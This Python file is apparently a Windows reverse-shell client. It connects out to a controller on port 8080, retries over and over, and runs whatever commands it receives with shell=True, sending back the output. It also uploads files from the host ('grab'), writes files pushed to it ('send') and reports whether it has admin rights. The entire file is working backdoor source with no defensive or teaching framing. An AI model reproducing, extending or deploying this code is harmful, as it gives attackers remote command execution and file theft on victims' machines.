import socket
import subprocess
import os
import ctypes
import time

def initiate():
    tuneConnection()

def tuneConnection():
    mySocket = socket.socket()
    #Trying to connect to server every 20 seconds
    while True:
        time.sleep(1)
        try:
            mySocket.connect(('0.0.0.0', 8080))
            shell(mySocket)

        except:
            tuneConnection()

def letGrab(mySocket, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(5000)
        while len(packet) > 0:
            mySocket.send(packet)
            packet = f.read(5000)
        mySocket.send('DONE'.encode())
    else:
        mySocket.send('File not found'.encode())

def letSend(mySocket, path, fileName):
    if os.path.exists(path):
        f = open(path + fileName, 'ab')
        while True:
            bits = mySocket.recv(5000)
            if bits.endswith('DONE'.encode()):
                # Write those last received bits without the word DONE
                f.write(bits[:-4])
                f.close()
                break
            if 'File not found'.encode() in bits:
                break
            f.write(bits)

def checkUserLevel():
    try:
        is_admin = ctypes.WinDLL('Shell32').IsUserAnAdmin()
        if is_admin:
            return "[+] Admin privileges acquired."
        else:
            return "[!!] No admin privileges!"
    except:
        return "[!!] Unable to determine privilege level."

def shell(mySocket):
    while True:
        command = mySocket.recv(5000)

        if 'terminate' in command.decode():
            try:
                mySocket.close()
                break
            except Exception as e:
                informToServer = "[+] Some error occurred." + str(e)
                mySocket.send(informToServer.encode())
                break

        elif 'grab' in command.decode():
            grab, path = command.decode().split('*')
            try:
                letGrab(mySocket, path)
            except Exception as e:
                informToServer = "[+] Some error occurred." + str(e)
                mySocket.send(informToServer.encode())

        elif 'send' in command.decode():
            send, path, fileName = command.decode().split('*')
            try:
                letSend(mySocket, path, fileName)
            except Exception as e:
                informToServer = "[+] Some error occurred." + str(e)
                mySocket.send(informToServer.encode())

        elif 'checkUserLevel' in command.decode():
            result = checkUserLevel()
            mySocket.send(result.encode())

        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(' ', 1)
                os.chdir(directory)
                informToServer = "[+] Current working directory is " + os.getcwd()
                mySocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occurred." + str(e)
                mySocket.send(informToServer.encode())

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            mySocket.send(CMD.stderr.read())
            mySocket.send(CMD.stdout.read())

def main():
    initiate()

main()


